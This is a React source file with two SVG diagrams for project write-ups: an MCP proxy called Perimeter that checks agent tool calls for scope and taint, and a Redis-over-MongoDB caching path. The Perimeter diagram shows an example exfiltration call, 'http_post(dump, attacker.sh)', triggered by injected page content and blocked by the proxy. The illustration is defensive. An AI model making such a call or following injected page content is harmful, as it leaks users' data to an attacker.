/**
 * Two projects have nothing to screenshot — Perimeter is a proxy, and
 * DesignDen's demo backend is offline. Both diagrams are drawn on a 440-unit
 * viewBox, the width of the figure column, so labels render at their true size.
 * Colours come from the theme tokens in index.css, never baked in here.
 */

export function PerimeterDiagram() {
  return (
    <svg
      className="diagram"
      viewBox="0 0 440 250"
      role="img"
      aria-label="Every tool call passes two checks in the Perimeter proxy: capability scope and taint. A clean, in-scope call runs, adding 0.34 milliseconds. A call whose argument was tainted by page content is dropped before it reaches the tool."
    >
      <defs>
        <marker className="m-ok" id="pd-arrow-ok" viewBox="0 0 8 8" refX="7" refY="4" markerWidth="6" markerHeight="6" orient="auto">
          <path d="M0 0 L8 4 L0 8 z" />
        </marker>
        <marker className="m-bad" id="pd-arrow-bad" viewBox="0 0 8 8" refX="7" refY="4" markerWidth="6" markerHeight="6" orient="auto">
          <path d="M0 0 L8 4 L0 8 z" />
        </marker>
      </defs>

      <g className="d-box">
        <rect x="0" y="0" width="440" height="122" rx="4" />
        <text x="16" y="27" className="d-title">PERIMETER</text>
        <text x="16" y="45" className="d-sub">transparent MCP proxy — every tool call</text>
        <line x1="0" y1="60" x2="440" y2="60" className="d-rule" />
        <text x="16" y="83" className="d-check">1 — capability scope</text>
        <text x="196" y="83" className="d-sub">is the tool in the agent’s grant?</text>
        <text x="16" y="106" className="d-check">2 — taint check</text>
        <text x="196" y="106" className="d-sub">is the argument untrusted?</text>
      </g>

      <g className="d-ok">
        <line x1="105" y1="122" x2="105" y2="158" markerEnd="url(#pd-arrow-ok)" />
        <text x="8" y="182" className="d-label">runs</text>
        <text x="8" y="202" className="d-sub">read_file(“notes.md”)</text>
        <text x="8" y="218" className="d-sub">in scope · argument clean</text>
        <text x="8" y="238" className="d-sub">+0.34 ms p95</text>
      </g>

      <g className="d-bad">
        <line x1="320" y1="122" x2="320" y2="158" markerEnd="url(#pd-arrow-bad)" strokeDasharray="5 4" />
        <text x="232" y="182" className="d-label">dropped</text>
        <text x="232" y="202" className="d-sub">http_post(dump, attacker.sh)</text>
        <text x="232" y="218" className="d-sub">argument tainted by page</text>
        <text x="232" y="238" className="d-sub">never reaches the tool</text>
      </g>
    </svg>
  )
}

export function DesignDenDiagram() {
  return (
    <svg
      className="diagram"
      viewBox="0 0 440 268"
      role="img"
      aria-label="A product query checks Redis first and is served on a hit, 97 percent faster. On a miss it falls through to MongoDB, served by 14 compound indexes on the filter paths profiling flagged, and the miss warms the cache."
    >
      <defs>
        <marker id="dd-arrow" viewBox="0 0 8 8" refX="7" refY="4" markerWidth="6" markerHeight="6" orient="auto">
          <path d="M0 0 L8 4 L0 8 z" />
        </marker>
        <marker className="m-ok" id="dd-arrow-ok" viewBox="0 0 8 8" refX="7" refY="4" markerWidth="6" markerHeight="6" orient="auto">
          <path d="M0 0 L8 4 L0 8 z" />
        </marker>
      </defs>

      <text x="0" y="14" className="d-label">product query</text>
      <text x="0" y="32" className="d-sub">GET /products?filter=…</text>

      <g className="d-muted">
        <line x1="56" y1="42" x2="56" y2="64" markerEnd="url(#dd-arrow)" />
      </g>

      <g className="d-box">
        <rect x="0" y="66" width="250" height="58" rx="4" />
        <text x="16" y="90" className="d-title">REDIS</text>
        <text x="16" y="108" className="d-sub">hot reads, cached</text>
      </g>

      <g className="d-ok">
        <line x1="250" y1="95" x2="322" y2="95" markerEnd="url(#dd-arrow-ok)" />
        <text x="258" y="88" className="d-sub">hit</text>
        <text x="332" y="92" className="d-label">served</text>
        <text x="332" y="110" className="d-sub">−97% latency</text>
      </g>

      <g className="d-muted">
        <line x1="56" y1="124" x2="56" y2="152" markerEnd="url(#dd-arrow)" strokeDasharray="5 4" />
        <text x="68" y="145" className="d-sub">miss</text>
      </g>

      <g className="d-box">
        <rect x="0" y="154" width="320" height="80" rx="4" />
        <text x="16" y="178" className="d-title">MONGODB</text>
        <text x="16" y="196" className="d-sub">14 compound indexes on the filter</text>
        <text x="16" y="212" className="d-sub">paths profiling flagged</text>
      </g>

      <text x="0" y="256" className="d-sub d-note">a miss warms the cache on the way back</text>
    </svg>
  )
}
